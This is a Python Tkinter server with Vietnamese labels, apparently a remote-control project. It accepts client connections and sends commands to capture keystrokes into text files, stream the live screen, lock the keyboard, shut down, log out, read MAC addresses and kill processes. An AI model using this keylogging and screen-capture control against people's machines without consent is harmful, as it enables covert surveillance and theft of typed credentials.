import socket
import os
from _thread import *
from tkinter import *
from zlib import decompress
import cv2
import numpy
from PIL import Image
from tkinter import messagebox

WIDTH = int(1366 / 1)
HEIGHT = int(768 / 1)

ServerSideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ServerSideSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
host = '127.0.0.1'
port = 2004

try:
    ServerSideSocket.bind((host, port))
except socket.error as e:
    print(str(e))

def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf

def CatchKeyboard(connection):
    def getKeyboard(): 
        name = userList[cur].replace(":", ".")
        name = name + ".txt"
        f = open(name, "a")

        while isCatchKeyboard[cur]:
            char = connection.recv(1024).decode('utf-8')
            if (char == "EnDCatCh"):
                isCatchKeyboard[cur] = False
                break
            print("catch")
            f.write(char)
            print(char)
        f.close()
        
    start_new_thread(getKeyboard,())

def WatchLiveScreen(connection):
    try:
        while isWatching[cur]:
                size_len = int.from_bytes(connection.recv(1), byteorder='big')
                
                size = int.from_bytes(connection.recv(size_len), byteorder='big')
                    
                if (size > 4196684):
                    isWatching[cur] = False
                    cv2.destroyAllWindows()
                    textForWatchLiveScreen.set("Xem màn hình")
                    break

                bgra = decompress(recvall(connection, size))

                img = Image.frombytes("RGB", (WIDTH, HEIGHT), bgra, "raw", "BGRX")
                np_ar = numpy.array(img, dtype=numpy.uint8)

                np_ar = numpy.flip(np_ar[:, :, :3], 2)
                cv2.imshow(userList[cur], np_ar)

                if cv2.waitKey(25) & 0xFF == ord("q"):
                    isWatching[cur] = False
                    cv2.destroyAllWindows()
                    textForWatchLiveScreen.set("Xem màn hình")
                    break
                
    except Exception as e:
        pass

def StopWatchLiveScreen():
    isWatching[cur] = False
    textForWatchLiveScreen.set("Xem màn hình")

def GetMacAddress(connection):
    mac = connection.recv(1024).decode('utf-8')
    messagebox.showinfo("Notification", "Địa chỉ MAC của " + userList[cur] + " là: " + mac)

def ShowProcesses(connection):
    def showProcess():
        win = Toplevel()
        win.wm_title("Processes " + userList[cur])
        win.wm_iconbitmap('./Server.ico')
        win.wm_geometry("500x600")
        
        my_frame1 = Frame(win)
        my_scrollbar1 = Scrollbar(my_frame1,orient=VERTICAL)

        my_listbox1 = Listbox(my_frame1, width=50, height=35, yscrollcommand=my_scrollbar1.set)
        
        curProcess = -1
        processList = list()

        def onSelect1(evt):
            nonlocal curProcess
            w = evt.widget
            cur2 = w.curselection()
            if (len(cur2)):
                curProcess = int(cur2[0])

        my_listbox1.bind('<<ListboxSelect>>', onSelect1)

        my_scrollbar1.config(command=my_listbox1.yview)
        my_scrollbar1.pack(side=RIGHT, fill=Y)

        my_frame1.grid(row=0,column=0,padx=10,pady=10)
        my_listbox1.pack()

        def killProcess():

            nonlocal processList
            print(curProcess)
            if (curProcess != -1):

                id = processList[curProcess][0:10]
                id = int(id)
                connection.send(str.encode("killProcess"))
                connection.send(str.encode(str(id)))

                processList.pop(curProcess)

                my_listbox1.delete(curProcess)                  # Clear user list

                messagebox.showinfo("Notification", "Kill successfully")               

        p3 = Frame(win,background='lightblue',width=30)
        p3.grid(row=0,column=1,padx=10,pady=10,sticky=W)    

        b8 = Button(p3, text="Kill", command=killProcess)
        b8.grid(row=0, column=0,padx=10,pady=10)

        b8 = Button(p3, text="Close", command=win.destroy)
        b8.grid(row=1, column=0,padx=10,pady=10)

        loop = True

        while loop:
            process = connection.recv(1024)
            process = process.decode('utf-8')
            if (process == "EndOfListProcess"):
                loop = False
                break
            if loop == False:
                break
            my_listbox1.insert(END,process)
            processList.append(process)
            
    start_new_thread(showProcess,())

def multi_threaded_client(connection,address):

    add = address[0] + ':' + str(address[1])

    connectionList.append(connection)
    userList.append(add)
    isCatchKeyboard.append(False)
    isLockKeyboard.append(False)
    isWatching.append(False)


    my_listbox.insert(END,userList[len(userList)-1])
    try:
        while True:
            data = connection.recv(1024)
            # response = 'Server message: ' + data.decode('utf-8')
            if not data:

                index = connectionList.index(connection)
                isCatchKeyboard.pop(index)
                isLockKeyboard.pop(index)
                isWatching.pop(index)
                connectionList.remove(connection)
                userList.remove(add)
                my_listbox.delete(index)                  # Clear user list
                
                connection.close()
                break
            try:
                message = data.decode('utf-8')
                print("message")
                print(message)
                if (message == "CatchKeyboard"):
                    CatchKeyboard(connection)
                
                if (message == "watchLiveScreen"):
                    WatchLiveScreen(connection)

                if (message == "stopWatchLiveScreen"):
                    StopWatchLiveScreen()

                if (message == "getMacAddress"):
                    GetMacAddress(connection)

                if (message == "showProcesses"):
                    ShowProcesses(connection)
                
            except:
                pass
                       

    except Exception as e:
        index = connectionList.index(connection)
        isCatchKeyboard.pop(index)
        isLockKeyboard.pop(index)
        isWatching.pop(index)

        connectionList.remove(connection)
        userList.remove(add)

        my_listbox.delete(index)                  # Clear user list

        print(e)
        print('close')
        connection.close()

def onClickCatchKeyboard():
    global cur
    print(cur)
    if (cur != -1):

        if (isWatching[cur]):
            messagebox.showinfo("Notification", "Dừng xem màn hình để bắt phím nhấn")

        else: 
            if (isCatchKeyboard[cur] == False):
                isCatchKeyboard[cur] = True
                textForCatch.set("Dừng bắt phím nhấn")

                # bat dau send bat phim nhan
                message = "CatchKeyboard"
                connectionList[cur].send(str.encode(message))
                
            else:
                isCatchKeyboard[cur] = False
                textForCatch.set("Bắt phím nhấn")

                # bat dau send dung bat phim nhan
                message = "EndCatchKeyboard"
                connectionList[cur].send(str.encode(message))

def onClickLockKeyboard():
    global cur
    print(cur)
    if (cur != -1):

        if (isLockKeyboard[cur] == False):
            isLockKeyboard[cur] = True
            textForLock.set("Mở bàn phím")

            # bat dau send bat phim nhan
            message = "LockKeyboard"
            connectionList[cur].send(str.encode(message))
            
        else:
            isLockKeyboard[cur] = False
            textForLock.set("Khoá bàn phím")

            # bat dau send dung bat phim nhan
            message = "UnLockKeyboard"
            connectionList[cur].send(str.encode(message))

def onClickWatchLiveScreen():
    global cur
    print(cur)
    if (cur != -1):

        if (isCatchKeyboard[cur]):
            messagebox.showinfo("Notification", "Dừng bắt phím nhấn để xem màn hình")

        else:

            if (isWatching[cur] == False):
                isWatching[cur] = True
                textForWatchLiveScreen.set("Dừng xem màn hình")

                message = "watchLiveScreen"
                connectionList[cur].send(str.encode(message))

            else: 
                message = "stopWatchLiveScreen"
                connectionList[cur].send(str.encode(message))

def onClickShutdown():
    global cur
    print(cur)
    if (cur != -1):

        res = messagebox.askyesno('Shutdown', 'Bạn có chắc muốn shutdown máy ' + userList[cur] + "?") 
        if res == True:
            message = "shutdown"
            connectionList[cur].send(str.encode(message))
        
def onClickLogout():
    global cur
    print(cur)
    if (cur != -1):
        res = messagebox.askyesno('Logout', 'Bạn có chắc muốn Logout máy ' + userList[cur] + "?") 
        if res == True:
            message = "logout"
            connectionList[cur].send(str.encode(message))

def onClickGetMacAddress():
    global cur
    print(cur)
    if (cur != -1):
        message = "getMacAddress"
        connectionList[cur].send(str.encode(message))
  
def onClickShowProcesses():
    global cur
    print(cur)
    if (cur != -1):

        message = "showProcesses"
        connectionList[cur].send(str.encode(message))

        
def startServer():
    
    try: 
        ServerSideSocket.listen()
        print('Socket is listening..')

        while True: 
            Client, address = ServerSideSocket.accept()
            print('Connected to: ' + address[0] + ':' + str(address[1]))
            start_new_thread(multi_threaded_client, (Client, address))
            

    finally:
        ServerSideSocket.shutdown(socket.SHUT_RDWR)
        ServerSideSocket.close()

if __name__ == '__main__':

    # Create a list to store client connections
    connectionList = list()
    # Create a list, and the user stores the user name separately
    userList = list()
    # current selected one
    cur = -1

    isCatchKeyboard = list()

    isLockKeyboard = list()

    isWatching = list()

    root = Tk()
    root.title('Server')
    root.iconbitmap('./Server.ico')
    root.geometry("600x600")

    textForCatch = StringVar()
    textForLock = StringVar()
    textForWatchLiveScreen = StringVar()

    textForCatch.set("Bắt phím nhấn")
    textForLock.set("Khoá bàn phím")
    textForWatchLiveScreen.set("Xem màn hình")
    
    my_frame = Frame(root)
    my_scrollbar = Scrollbar(my_frame,orient=VERTICAL)

    my_listbox = Listbox(my_frame, width=60, height=35, yscrollcommand=my_scrollbar.set)
    
    def onSelect(evt):
        # Note here that Tkinter passes an event object to onselect()
        global cur
        w = evt.widget
        cur1 = w.curselection()
        if (len(cur1)):
            cur = int(cur1[0])

            if (isCatchKeyboard[cur]):
                textForCatch.set("Dừng bắt phím nhấn")
            else:
                textForCatch.set("Bắt phím nhấn")

            if (isLockKeyboard[cur]):
                textForLock.set("Mở bàn phím")
            else:
                textForLock.set("Khoá bàn phím")
            
            if (isWatching[cur]):
                textForWatchLiveScreen.set("Dừng xem màn hình")
            else:
                textForWatchLiveScreen.set("Xem màn hình")

    
    my_listbox.bind('<<ListboxSelect>>', onSelect)

    my_scrollbar.config(command=my_listbox.yview)
    my_scrollbar.pack(side=RIGHT, fill=Y)

    my_frame.grid(row=0,column=0,padx=10,pady=10)
    my_listbox.pack()

    p2 = Frame(root,background='lightblue',width=40)
    p2.grid(row=0,column=1,padx=0,pady=5,sticky=W)    
    
    b0 = Button(p2,textvariable=textForCatch,command=onClickCatchKeyboard)
    b0.grid(row=0,column=0,padx=30,pady=14,sticky=W)

    b1 = Button(p2,textvariable=textForLock,command=onClickLockKeyboard)
    b1.grid(row=1,column=0,padx=30,pady=14,sticky=W)

    b2 = Button(p2,textvariable=textForWatchLiveScreen,command=onClickWatchLiveScreen)
    b2.grid(row=2,column=0,padx=30,pady=14,sticky=W)

    b3 = Button(p2,text="Shutdown",command=onClickShutdown)
    b3.grid(row=3,column=0,padx=30,pady=14,sticky=W)

    b4 = Button(p2,text="Logout",command=onClickLogout)
    b4.grid(row=4,column=0,padx=30,pady=14,sticky=W)

    b5 = Button(p2,text="Xem MAC address",command=onClickGetMacAddress)
    b5.grid(row=5,column=0,padx=30,pady=14,sticky=W)

    b7 = Button(p2,text="Xem processes",command=onClickShowProcesses)
    b7.grid(row=7,column=0,padx=30,pady=14,sticky=W)
    

    start_new_thread(startServer,())

    root.mainloop()
